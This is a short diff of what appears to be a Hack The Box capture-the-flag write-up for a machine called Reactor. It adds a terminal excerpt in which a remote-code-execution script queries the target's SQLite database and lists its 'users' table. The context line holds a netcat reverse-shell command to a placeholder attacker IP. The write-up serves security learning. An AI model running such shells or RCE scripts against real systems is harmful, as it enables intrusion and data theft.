@@ -1054,7 +1054,13 @@ busybox nc <YOUR_IP> 4444 -e /bin/sh
 
 Once the shell connects, query the DB(`reactor.db`) we found:
 
+```shell
+                                                                                          
+┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
+└─$ python3 rce.py "sqlite3 /opt/reactor-app/reactor.db .tables"
+sensor_logs  users
 
+```
 <div align="center">
 <br>
 <br>
